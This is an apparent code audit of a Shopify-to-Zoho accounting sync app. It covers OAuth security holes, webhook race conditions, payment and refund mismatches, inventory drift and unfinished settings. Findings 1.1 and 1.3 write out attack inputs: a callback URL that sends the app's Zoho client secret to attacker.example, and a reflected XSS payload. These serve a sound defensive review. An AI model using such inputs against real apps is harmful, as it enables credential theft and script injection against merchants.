# App Audit: Broken and Unreliable Features

## How this audit was done

- I read all of the server code: the Zoho client, every model, every webhook route, the OAuth callback, settings, and migrations. I also read the loaders, actions and main UI logic of every admin page.
- I ran the project's own checks:
  - `vitest`: **58/58 tests pass**
  - `react-router build`: **succeeds**. There is one warning: `paymentSync.server.js` is imported both dynamically and statically.
  - `eslint app`: **88 errors**. 63 are `react/prop-types`, 23 are jsx-a11y, 1 is an unused `admin` in `app.sync-history.jsx`, and 1 is `process` no-undef in `app.jsx`.
- I did **not** run anything against a live Zoho or Shopify store. Every finding comes from reading the code. Items marked _(verify)_ depend on how Zoho behaves and need a live test to confirm.

Severity levels:
- 🔴 **Critical**: a security hole, or accounting data that silently comes out wrong.
- 🟠 **High**: a core flow that fails or misbehaves under normal use.
- 🟡 **Medium**: works only in limited cases, or is misleading.
- ⚪ **Low**: polish or hygiene.

---

## 1. Security & privacy

### 🔴 1.1 The Zoho client secret can be stolen through the OAuth callback
- **Where:** [auth.zoho.callback.jsx:52](app/routes/auth.zoho.callback.jsx#L52), [auth.zoho.callback.jsx:74](app/routes/auth.zoho.callback.jsx#L74) → [zoho.server.js:94-119](app/zoho.server.js#L94-L119)
- **What happens:** The callback reads the `accounts-server` query parameter and passes it straight to `exchangeCodeForToken`. That function then POSTs `client_id` and **`client_secret`** to `${accountsServer}/oauth/v2/token`. Any merchant who installs the app can get a valid signed `state` for their own shop and open `/auth/zoho/callback?code=x&state=<valid>&accounts-server=https://attacker.example`. The server then sends the app's Zoho client secret to the attacker's server. The same flaw is also a server-side request forgery (SSRF) vector.
- **Fix:** Only accept an `accounts-server` whose host is on an allowlist of Zoho domains, for example `accounts.zoho.(com|eu|in|com.au|jp|sa|ca|com.cn)` or `accounts.zohocloud.ca`. Reject everything else.

### 🔴 1.2 The raw Zoho access token is sent to the browser
- **Where:** [settings.server.js:82](app/models/settings.server.js#L82) (`accessToken: token?.accessToken`), used by the "show/copy token" UI in `app.settings.jsx`
- **What happens:** The loader returns the live Zoho OAuth access token to the client. Anyone with access to the admin page, a browser extension or an XSS bug can read it. That token has `ZohoBooks.fullaccess.all` and `ZohoInventory.fullaccess.all` on the merchant's books.
- **Fix:** Only send `tokenMasked`. Remove the copy and reveal buttons.

### 🟠 1.3 Reflected XSS on the OAuth result page
- **Where:** [auth.zoho.callback.jsx:11-42](app/routes/auth.zoho.callback.jsx#L11-L42), [auth.zoho.callback.jsx:57](app/routes/auth.zoho.callback.jsx#L57)
- **What happens:** `errorParam` (read from the URL) and `organization.name` are placed into the HTML without escaping. For example, `/auth/zoho/callback?error=<img src=x onerror=alert(1)>` runs script on the app's own origin.
- **Fix:** HTML-escape every interpolated value.

### 🟠 1.4 The OAuth `state` is not tied to the browser that started the connection
- **Where:** [zoho.server.js:31-72](app/zoho.server.js#L31-L72)
- **What happens:** The state is only an HMAC of `{shop, ts}` and is valid for 15 minutes. Nothing links it to the browser or session that started the connection. An attacker can send a victim their own "Connect Zoho" link. When the victim authorizes it, the **victim's Zoho org is linked to the attacker's Shopify store**. This is a login-CSRF attack.
- **Fix:** Store a nonce in a cookie or the DB when the link is created, and check it in the callback.

### 🟠 1.5 A hardcoded fallback secret is used for signing
- **Where:** [zoho.server.js:24-26](app/zoho.server.js#L24-L26)
- **What happens:** If `SHOPIFY_API_SECRET` is not set, OAuth states are signed with the public string `"zoho-oauth-state-secret"`, so anyone can forge them.
- **Fix:** Refuse to start without the secret.

### 🟠 1.6 Customer PII is written to server logs on every Customers page load
- **Where:** [app.customers.jsx:57](app/routes/app.customers.jsx#L57) (`console.log("CUSTOMER_DEBUG", …)`)
- **What happens:** This is leftover debug code. It logs every customer's name and email on each page view. That conflicts with the app's GDPR and compliance commitments.

### 🟡 1.7 Compliance webhooks do not delete all personal data
- **Where:** [webhooks.compliance.jsx](app/routes/webhooks.compliance.jsx), [webhookLog.server.js:8-31](app/models/webhookLog.server.js#L8-L31)
- **What happens:**
  - Every webhook payload is stored in full in `webhook_logs.payload` and is never purged. That includes orders, fulfillments with shipping addresses, refunds and customers.
  - `customers/redact` only deletes rows whose `resource_id` matches the customer or order GID. Fulfillment and refund logs for the same person are kept, and so are guest `guest:<email>` mappings.
  - `customers/data_request` does nothing.
- **Fix:** Add a retention period for `webhook_logs`, and redact by `shopify_parent_id` or order id across all entity types.

### 🟡 1.8 Too many access scopes are requested (App Store review risk)
- **Where:** [shopify.app.toml](shopify.app.toml) requests **84 scopes**, including gift cards, pixels, markets, metaobjects, navigation, themes/content, payment customizations and `customer_*`/`unauthenticated_*`.
- **What happens:** The app only needs about 8 of them. Shopify review usually rejects over-scoped apps, and merchants see an alarming permission screen. The scope list also caused the `shopify_sessions.scope` overflow that needed migration `20260825090000`.
- **Missing scope:** `read_all_orders` is not requested (see 3.10).

### ⚪ 1.9 The DB password is put into the session-storage URL without encoding
- **Where:** [shopify.server.js:17-18](app/shopify.server.js#L17-L18)
- **What happens:** If `DB_PASSWORD` contains `@`, `:`, `/`, `#` or `%`, the MySQL session storage cannot connect. The main `db.server.js` pool is not affected.
- **Fix:** Wrap the credentials in `encodeURIComponent`.

---

## 2. Webhooks & sync reliability (affects every entity)

### 🔴 2.1 Race conditions create duplicate Sales Orders, Items and Contacts in Zoho
- **Where:** [orderSync.server.js:339-351](app/models/orderSync.server.js#L339-L351), [invoiceSync.server.js:92-111](app/models/invoiceSync.server.js#L92-L111), the equivalent code in `productSync` and `customerSync`
- **What happens:**
  - For a normal checkout, Shopify sends `orders/create`, `orders/paid` and often `orders/updated` within about a second of each other.
  - Each handler loads a snapshot of `sync_mappings`, sees no mapping for the order, and calls `createZohoSalesOrder`. The paid handler reaches the same call through `syncInvoiceForOrder → syncOrderToZoho`.
  - Nothing locks the order and nothing enforces uniqueness, so Zoho ends up with **2–3 sales orders for one Shopify order**. The mapping keeps whichever write came last, and the other orders are orphaned but still count in Zoho's books.
  - The same thing happens with `products/create` + `products/update`, which creates duplicate items when a variant has no SKU match yet. It also happens with `customers/create` + `customers/update`, which creates duplicate contacts.
- **Fix:** Take a per-resource lock around "look up mapping → create in Zoho → save mapping". A `SELECT … FOR UPDATE` on a placeholder mapping row or `GET_LOCK()` would work. Better still, move webhook work to a queue with one worker per shop.

### 🟠 2.2 A webhook that fails once is never retried
- **Where:** [webhookLog.server.js:8-31](app/models/webhookLog.server.js#L8-L31) and all `process*Webhook` functions
- **What happens:** The handler inserts `webhook_id` first. If processing then fails (Zoho down, token refresh fails, rate limit), the log is marked `failed` and the route still returns **200**. Shopify therefore never redelivers the event. If Shopify does redeliver after a timeout, the duplicate check (`ER_DUP_ENTRY`) skips it anyway. Nothing re-queues failed events, so they are lost. For example, a failed `refunds/create` means the refund never reaches Zoho.
- **Fix:** Add a retry job over `webhook_logs WHERE status='failed'`, or return 5xx and only mark the log as processed after the work succeeds.

### 🟠 2.3 All webhook work runs inside the request and often exceeds Shopify's 5-second limit
- **What happens:** An `orders/paid` webhook can call Zoho 8–15 times in sequence: token refresh, contact lookup and create, item lookup and create per line, sales order, invoice, payment. Shopify times out after 5 s, counts the delivery as failed, and eventually warns the merchant. The work keeps running, and the redelivery is dropped as a duplicate.
- **Fix:** Acknowledge immediately and process in the background with a queue.

### 🟠 2.4 Many "Sync now" actions run synchronously and time out
- **Where:** [app._index.jsx](app/routes/app._index.jsx) action runs product + customer + order + inventory sync in one request. [orderSync.server.js:669-771](app/models/orderSync.server.js#L669-L771), `runProductSync`, `runCustomerSync` and `runInventoryPull` each page through the **entire** store.
- **What happens:**
  - A store with a few hundred orders or products makes thousands of sequential Zoho calls in a single HTTP request. The browser, the Apache proxy (`.htaccess` `[P]`) or the Shopify admin gives up long before it finishes.
  - There is no `try/finally`, so a crash leaves the `sync_logs` row stuck at `running` for good, and it shows as "In Progress" on the Reporting page.
  - Every run also **re-updates every record** in Zoho with no change detection. That uses up Zoho's per-minute limit (about 100/min) and daily limit (1k–10k per org, depending on plan).
- **Fix:** Run syncs as background jobs, sync only records changed since the last run, and handle 429 responses with backoff.

### 🟠 2.5 No handling for Zoho rate limits or error responses that aren't JSON
- **Where:** every function in [zoho.server.js](app/zoho.server.js)
- **What happens:** `await response.json()` throws on HTML or empty bodies (Zoho sends these on 429/5xx), so the real cause is lost. There is no retry or backoff anywhere.

### 🟠 2.6 Concurrent token refreshes, and no reconnect path when a token is revoked
- **Where:** [zohoConnection.server.js:84-112](app/models/zohoConnection.server.js#L84-L112)
- **What happens:**
  - When the access token expires, every webhook arriving at that moment refreshes it at the same time. Zoho throttles refresh-token requests, so some of those calls fail.
  - If the merchant revokes access in Zoho, or the refresh token is invalidated, the connection stays `is_active = TRUE`. Every sync then fails with a generic error, and the UI still shows **"Connected"**.
- **Fix:** Refresh behind a lock. On `invalid_code` or `invalid_token`, mark the connection as needing re-authorization and show that in the UI.

### 🟡 2.7 Errors on first-time syncs are never stored
- **Where:** `markOrderMappingError`, `markInvoiceMappingError`, `markPaymentMappingError`, `markProductMappingError`, `markCustomerMappingError`
- **What happens:** All of these are `UPDATE`-only. If the very first create fails, no mapping row exists yet, so the error goes nowhere. The Orders, Products and Customers pages then show "Not synced" instead of "Sync failed" with the reason.
- **Fix:** Use an upsert with a placeholder `zoho_id`, or store failures separately.

### 🟡 2.8 Webhooks for uninstalled shops mark them active again, and uninstalling cleans nothing up
- **Where:** [webhooks.app.uninstalled.jsx](app/routes/webhooks.app.uninstalled.jsx), [shop.server.js](app/models/shop.server.js)
- **What happens:**
  - Uninstalling only deletes the Shopify sessions. `shops.is_active` / `uninstalled_at` are never set, and the Zoho connection and tokens are kept.
  - Every webhook calls `ensureShop()`, which forces `is_active = TRUE` and `uninstalled_at = NULL` on each call.
  - `shop_name` and `email` are never populated.

---

## 3. Orders, invoices, payments

### 🔴 3.1 Line items are dropped silently, so Zoho totals don't match Shopify
- **Where:** [orderSync.server.js:215-279](app/models/orderSync.server.js#L215-L279)
- **What happens:** These line items are skipped with no warning:
  - Any line **without a SKU**.
  - Any line without a variant: custom items, deleted products, tips.
  - Any line whose variant sync **failed**.

  The sales order, and the invoice created from it, are then short. This is the same class of bug as the documented order #1001 incident, and it still happens for new variants and SKU-less products. Payment then fails with Zoho `24016` ("amount more than balance due") because the payment uses Shopify's full `totalPrice`.
- **Fix:** Send unmapped lines as free-text line items (name + rate, no `item_id`), or fail the order loudly.

### 🔴 3.2 The payment amount doesn't match the invoice in common cases
- **Where:** [paymentSync.server.js buildZohoPaymentPayload](app/models/paymentSync.server.js)
- **What happens:** The payment amount is always `order.totalPrice`. These cases break it:
  - Tax-inclusive stores, because `is_inclusive_tax` comes from a manual setting and not from `order.taxes_included`.
  - Shipping tax, which is included in Shopify's total but not itemized in Zoho (see 3.8).
  - Dropped lines (3.1).
  - Gift-card or split-tender payments, which are recorded as a single payment mode.

  Any of these produces a `24016` failure, or an invoice left partly paid.
- **Fix:** Use `order.taxes_included`. Take the payment amount from the Zoho invoice's `balance`, or from the actual Shopify transactions.

### 🟠 3.3 The payment is skipped for first-time customers
- **Where:** [paymentSync.server.js syncInvoiceAndPaymentForOrder](app/models/paymentSync.server.js) (`customerMappings[...]?.zohoId`)
- **What happens:** `customerMappings` is a snapshot loaded before the call. If `syncInvoiceForOrder → syncOrderToZoho` creates the Zoho contact during this call, the snapshot doesn't include it. The payment is then skipped with "no invoice or customer to pay against", and the webhook is logged as `processed`. The invoice stays unpaid until someone runs "Sync now" by hand.
- **Fix:** Use `invoice.customer_id`, or the customer id returned by the sync.

### 🟠 3.4 Orders from customers without an email are skipped entirely
- **Where:** [orderSync.server.js:306-309](app/models/orderSync.server.js#L306-L309), [customerSync.server.js syncCustomerToZoho](app/models/customerSync.server.js)
- **What happens:** Phone-only customers, POS walk-in sales and orders with no customer are never sent to Zoho. They show "skipped" and give no reason.

### 🟠 3.5 Order edits after invoicing are ignored but reported as success
- **Where:** [orderSync.server.js:355-362](app/models/orderSync.server.js#L355-L362)
- **What happens:** Once an invoice exists, Zoho's `36023` lock error is converted into `status: "success"`. Added or removed items, quantity changes and address changes after payment never reach Zoho, and the UI shows "Synced".

### 🟠 3.6 Cancellation handling is incomplete
- **Where:** [orderSync.server.js:926-940](app/models/orderSync.server.js#L926-L940)
- **What happens:**
  - Voiding fails for an order that is already invoiced or paid, which is the usual state for a cancelled order. The invoice is not voided and no credit note is created unless a refund webhook also arrives.
  - The `orders/updated` webhook that Shopify sends with every cancellation re-syncs the order and can overwrite the `voided` status with `synced` or `error`.
  - "Sync now" also sends updates to orders that were already voided.

### 🟡 3.7 The backfill only handles `PAID` orders
- **Where:** [orderSync.server.js:731](app/models/orderSync.server.js#L731)
- **What happens:** `PARTIALLY_PAID`, `PARTIALLY_REFUNDED` and `REFUNDED` orders never get an invoice or payment from the bulk sync.

### 🟡 3.8 Shipping tax and line-level discounts are approximated
- **What happens:** Shipping tax cannot be itemized in Zoho, which is documented. The order-level discount is sent as a single `entity_level` amount, which includes line discounts. Totals can drift by a few cents or more per order, and the reconciliation page will then flag those orders.

### 🟡 3.9 Queries stop at 50 line items and 50 variants
- **Where:** [orderSync.server.js:459](app/models/orderSync.server.js#L459), [productSync.server.js:303](app/models/productSync.server.js#L303)
- **What happens:** Lines beyond 50 in an order (bulk sync path) and variants beyond 50 in a product are silently ignored. Shopify now allows up to 2048 variants per product.

### 🟡 3.10 Only the last 60 days of orders are reachable
- **What happens:** Without the `read_all_orders` scope, Shopify's `orders` query only returns about the last 60 days. "Sync now", the invoice/payment backfill and the payment reconciliation silently ignore older orders.

### 🟡 3.11 The payment date is wrong
- **What happens:** The payment date is `order.updatedAt`, which changes with any later edit. It should be the date the money was captured, taken from the transaction's `processed_at`.

---

## 4. Refunds & fulfillments

### 🔴 4.1 Refunds with tax or shipping fail or are recorded wrong _(verify)_
- **Where:** [refundSync.server.js:82-168](app/models/refundSync.server.js#L82-L168)
- **What happens:**
  - The credit note is built from item `rate × qty` with **no `tax_id`**, and it leaves out any refunded shipping.
  - The refund is then recorded for `refund.amount`, the real money refunded including tax and shipping. That is more than the credit note's balance, so Zoho is expected to reject it.
  - For an unpaid invoice, the credit note is applied to the invoice first. That uses up its whole balance, so the following refund also fails.
  - If a step fails after the credit note was created, the credit note is left orphaned and the webhook is never retried (2.2).

### 🟠 4.2 Refunds that aren't tied to line items are never recorded
- **Where:** [refundSync.server.js:116-118](app/models/refundSync.server.js#L116-L118)
- **What happens:** A refund that only covers shipping, a goodwill or partial-amount refund, or a refund of a SKU-less item has no matching line items. It is logged as "skipped" and the money refunded never reaches Zoho. This contradicts the code comment saying transactions are used so that goodwill refunds are covered.

### 🟠 4.3 Stock may be counted twice _(verify)_
- **What happens:**
  - Shopify's own stock changes (from a sale, a restock or a refund) are pushed to Zoho as **absolute** adjustments through `inventory_levels/update`.
  - The app also creates Zoho Invoices, Packages and Shipments (on sale or fulfillment) and Credit Notes (on refund). With inventory tracking on, Zoho moves stock again for those documents.
  - So Zoho stock drifts on every sale and every refund until the next Shopify inventory webhook overwrites it. If "Pull from Zoho" runs in between, it pushes the wrong number back to Shopify.
- **Fix:** Pick one system as the stock authority, or skip the webhook push for changes caused by orders.

### 🟡 4.4 Fulfillment edge cases
- **Where:** [fulfillmentSync.server.js](app/models/fulfillmentSync.server.js)
- **What happens:**
  - The app has no `fulfillments/update` subscription, so tracking numbers added after the fulfillment is created never sync. The fulfillment name (for example "#1001.1") is used as a fake tracking number instead.
  - Lines are matched by SKU only, so two lines with the same SKU collapse into one.
  - If the sales order doesn't exist yet (see the race in 2.1), the fulfillment is "skipped" for good.

---

## 5. Inventory

### 🟠 5.1 The two systems compare different quantities
- **Where:** [inventorySync.server.js:50-54](app/models/inventorySync.server.js#L50-L54), [inventorySync.server.js:242-272](app/models/inventorySync.server.js#L242-L272)
- **What happens:** Shopify's `available` leaves out committed units (orders placed but not yet fulfilled). Zoho's `location_stock_on_hand` includes them.
  - **Push:** Zoho's on-hand stock is set lower than it really is.
  - **Pull:** Shopify's available stock is set to on-hand, which overstates what can be sold and **causes overselling**, the opposite of the intended oversell protection.

### 🟠 5.2 "Pull from Zoho" breaks for larger catalogs
- **What happens:**
  - One `nodes(ids: …)` query is sent with **all** mapped variant IDs. Shopify caps that at 250 IDs, and the query-cost limit applies too.
  - One `inventorySetQuantities` call is sent with every change. Any single `userError` marks the **whole batch** as failed.
  - Each mapped variant costs one Zoho GET, all run in sequence inside the request (2.4).

### 🟡 5.3 Concurrent inventory webhooks can apply the same change twice
- **What happens:** The delta is computed from a fresh fetch of Zoho stock, but two webhooks for the same item that arrive close together both use the old value. Both then apply their delta.

### 🟡 5.4 The Inventory page shows misleading data
- **Where:** [app.inventory.jsx](app/routes/app.inventory.jsx)
- **What happens:**
  - Only the first 250 variants are shown, and only for the **first** location. The note "Pagination temporarily disabled" is visible on the page.
  - `available` uses `variant.inventoryQuantity`, which is the total across **all** locations, but it's labelled as the first location's stock.
  - The warehouse column shows `Warehouse <last 4 digits of id>` ([line 137](app/routes/app.inventory.jsx#L137)) instead of the Zoho warehouse name.
  - The low-stock threshold is hardcoded at `<= 10` ([line 128](app/routes/app.inventory.jsx#L128)).
  - "Inventory value" uses the selling price, not the cost.
  - Every row's "updated at" is the time of the last pull, not that row's own update.

---

## 6. Products & customers

### 🟠 6.1 Deleting in Shopify permanently deletes records that were already in Zoho
- **Where:** [productSync.server.js:508-547](app/models/productSync.server.js#L508-L547), [customerSync.server.js syncCustomerDeletionToZoho](app/models/customerSync.server.js)
- **What happens:** Sync links to Zoho items and contacts that **already existed** before the app, matched by SKU or email. When the Shopify product or customer is deleted, the app hard-deletes the merchant's original Zoho record. It only falls back to "inactive" when Zoho refuses the delete.
- **Fix:** Deactivate by default, or only delete records that the app created.

### 🟠 6.2 Customers with the same name fail to sync _(verify)_
- **What happens:** Zoho requires `contact_name` to be unique within an org. The payload uses "First Last", so the second "John Smith" with a different email is expected to fail on create. It should fall back to something like "John Smith (email)".

### 🟠 6.3 Every product update sends a burst of Zoho calls
- **What happens:** `products/update` also fires for inventory and metafield changes. Each one re-updates **every variant** in Zoho: an item PUT, a status POST, and a Shopify `productVariantsBulkUpdate`. A single sale can therefore cost dozens of Zoho calls and quickly uses up the daily quota.
- **Fix:** Compare against the last pushed values and skip unchanged variants.

### 🟡 6.4 Removed variants are never cleaned up
- **What happens:** When a variant is deleted from a product (on a product update, not a whole-product delete), its mapping and Zoho item stay active.

### 🟡 6.5 Adopted Zoho items can be overwritten or rejected _(verify)_
- **What happens:** The item payload always sends `item_type: "inventory"`, and only sends `track_inventory` when an Inventory account is set. For an existing Zoho "service" or non-tracked item linked by SKU, the update may fail or change its type. It also overwrites the Zoho name, rate and description every time.

### 🟡 6.6 Only one warehouse mapping per location, and no way to choose the Zoho org
- **What happens:**
  - Warehouse mapping loads only `locations(first: 50)`.
  - The Zoho org is taken as `organizations[0]` or the **global** `ZOHO_ORGANIZATION_ID` env var ([zoho.server.js:1019](app/zoho.server.js#L1019)). This is a public app, so a merchant with several Zoho orgs can't choose one, and the env var would force every merchant onto the same org id.

### 🟡 6.7 Refreshing tokens fails for the Canada data center
- **Where:** [zohoConnection.server.js:101](app/models/zohoConnection.server.js#L101)
- **What happens:** The refresh URL is built as `https://accounts.zoho.${data_center}`. Zoho Canada uses `accounts.zohocloud.ca`, so refreshing tokens fails there.
- **Fix:** Store the real `accounts-server` from the callback.

### 🟡 6.8 Product and item calls may fail for orgs without Zoho Inventory _(verify)_
- **What happens:** Items, packages, shipments and adjustments go through `/inventory/v1/*`, while everything else uses `/books/v3/*`. A merchant with only Zoho Books may not have access to the Inventory API. If so, product sync, fulfillment sync and inventory sync fail for them.

---

## 7. Settings page

### 🟠 7.1 Several saved settings are never used
| Setting | Saved in | Used by sync? |
|---|---|---|
| Sync preferences (products / orders / customers on/off) | [settings.server.js:105](app/models/settings.server.js#L105) | ❌ Never read. There is also **no UI** that submits `save-sync-preferences`, so sync can't be turned off. |
| Default **Sales account** | [settings.server.js:118](app/models/settings.server.js#L118) | ❌ Never sent on items or sales orders. |
| IP whitelisting, email notifications | [settings.server.js:123-124](app/models/settings.server.js#L123-L124) | ❌ Not implemented anywhere. |
| "App Access" users / roles, "Manage Access", "Remove Access" | `app.settings.jsx` Account section | ❌ Cosmetic only. "Remove Access" just closes the menu, and the list is always the one current user as "Administrator". |

### 🟠 7.2 "Test connection" and "Disconnect" don't really check or disconnect anything
- **What happens:**
  - "Test connection" only calls `getValidAccessToken`. If the token is still cached it never contacts Zoho, and on failure it throws into the error boundary instead of showing a message.
  - "Disconnect" only flips `is_active`. It doesn't revoke the Zoho refresh token, and the stored tokens stay in the DB.

### 🟡 7.3 Custom tax mappings are useless and pile up
- **Where:** [useZohoConnectionSync.js:78](app/hooks/useZohoConnectionSync.js#L78)
- **What happens:** "Add custom mapping" saves keys like `taxrate:custom_<timestamp>`, which can never match a Shopify tax-rate key. They are saved into `rateMap` for good, and the loader re-displays them as extra rows on every visit.
- **Also:** This hook edits the DOM directly (it injects `<style>`, rows and menus) outside React. Its cleanup removes the `message` listener with `capture: true` ([line 158](app/hooks/useZohoConnectionSync.js#L158)) although the listener was added without it, so the listener leaks.

### 🟡 7.4 Every settings page load is expensive
- **What happens:** Each load scans the last 250 orders for tax rates (`detectShopifyTaxRates`), plus up to four Zoho list calls whenever the 15-minute cache has expired.

### 🟡 7.5 Saving settings can overwrite other settings
- **Where:** [appSettings.server.js mergeAppSettings](app/models/appSettings.server.js)
- **What happens:** Settings are saved with an unlocked read-modify-write. Two saves at the same time (for example, the loader refreshing its cache while the user saves tax settings) can overwrite each other.

---

## 8. Reporting / Sync History, Dashboard & other pages

### 🟡 8.1 The Reporting page shows wrong values
- **Where:** [app.sync-history.jsx](app/routes/app.sync-history.jsx)
- **What happens:**
  - "Triggered by" shows **"Scheduled"** for every Shopify→Zoho run ([line 57](app/routes/app.sync-history.jsx#L57)), but the app has no scheduler.
  - The "Process" column is always "Shopify → Zoho Books", even for the inventory pull and reconciliation.
  - Invoice and payment runs are labelled "Orders" and can't be filtered separately.
  - All matching rows, including their JSON metadata, are loaded with no pagination (`getSyncHistoryAll`), so the page grows without limit.
  - The nav label says **"Reporting"** but the page heading says "Sync History".

### 🟡 8.2 The Dashboard is misleading
- **What happens:**
  - "Synced" shows as soon as any log row exists, even if it ended with errors.
  - The Shopify card is always "connected".
  - The Inventory KPI counts inventory **webhooks** processed, not items.
  - Sync actions return `null`, so a failure or missing token gives the user no feedback. The same is true for the per-row product sync, orders sync and inventory pull.

### 🟡 8.3 Currency is hardcoded to USD
- **Where:** [app.orders.jsx:19](app/routes/app.orders.jsx#L19), [app.products.jsx:57](app/routes/app.products.jsx#L57), [app.inventory.jsx:180](app/routes/app.inventory.jsx#L180)
- **What happens:** Stores that sell in INR, EUR, GBP and so on see every amount with a `$`.

### 🟡 8.4 Orders page filters and pagination only cover the current page
- **What happens:** Search, filters and Export only work on the 10 orders currently loaded. The page selector shows a hardcoded "1".

### 🟡 8.5 Help & Support buttons are broken
- **Where:** [app.help-support.jsx](app/routes/app.help-support.jsx)
- **What happens:**
  - "Chat with support" calls `window.Tawk_API.toggle()`, but the Tawk.to script is **never loaded**, so the button does nothing.
  - "Leave a review" opens **MAG: Form Builder's** reviews page ([line 53](app/routes/app.help-support.jsx#L53)) instead of this app's listing.

### ⚪ 8.6 Leftover template and UI placeholders
- The "store switcher" dropdowns on the Settings, Inventory and Reporting pages only list the current store, labelled "My Shopify Store".
- [shopify.app.toml](shopify.app.toml) still declares the template's demo `product.metafields.app.demo_info` and `metaobjects.app.example` definitions. Every install creates them.
- [ZOHO_INTEGRATION_SCOPE_STATUS.md](ZOHO_INTEGRATION_SCOPE_STATUS.md) mentions `extensions/zoho-embed`, but no `extensions/` folder exists.

### ⚪ 8.7 Most of the app isn't translated
- The app ships 20 locale files, but only the nav, Help page and a few labels use `t()`. Every other page is hardcoded English.

### ⚪ 8.8 Production console noise
- [root.jsx](app/root.jsx) logs Web Vitals (LCP/CLS) to every merchant's console.

---

## 9. Build, deploy & code health

| # | Issue | Severity |
|---|---|---|
| 9.1 | [knexfile.js](knexfile.js) only defines `development`. `npm run db:migrate` with `NODE_ENV=production` fails because no config exists for that environment. | 🟡 |
| 9.2 | Migration `20260825090000_widen_shopify_sessions_scope` alters `shopify_sessions`, a table that the MySQL session package creates **at runtime**. On a fresh database `knex migrate:latest` fails before the app has ever started. | 🟡 |
| 9.3 | `db.server.js` defaults to port `3307` and user `root` with an empty password. With a missing `.env`, the app silently tries to connect as root. | ⚪ |
| 9.4 | 88 ESLint errors, so a lint check in CI would fail. Most are prop-types and a11y. The route files are compressed onto single lines of up to about 7,000 characters, which makes review and diffs impractical. | ⚪ |
| 9.5 | The unit tests cover only the pure payload builders and normalizers. Nothing tests the webhook routes, the concurrency above, the OAuth callback or Settings actions, which is why 1.1 and 2.1 aren't caught. | ⚪ |
| 9.6 | `describeZohoError` is copy-pasted into 8 files, and the `getConnection → getValidAccessToken → zohoAuth` block is repeated in every webhook and action. | ⚪ |

---

## Suggested fix order

1. **Security first:** 1.1 (callback secret), 1.2 (token to the browser), 1.3 (XSS), 1.6 (PII log), 1.4 and 1.5.
2. **Accounting correctness:** 2.1 (duplicate sales orders), 3.1 and 3.2 (dropped lines and payment mismatch), 3.3 (skipped payments), 4.1 and 4.2 (refunds).
3. **Reliability:** move webhooks and "Sync now" to a background queue with retries and rate limiting (2.2–2.5), and handle token revocation (2.6).
4. **Inventory semantics:** 5.1 and 4.3. Decide which system owns stock and which quantity field is compared.
5. **Destructive behavior:** 6.1 (hard deletes of records that already existed in Zoho).
6. **Unfinished UI and settings:** 7.1–7.3 and 8.x. Remove or implement the placeholder settings, sync toggles and support buttons.
7. **Store listing:** trim the scopes and add `read_all_orders` (1.8, 3.10), and remove the template metafield and metaobject.
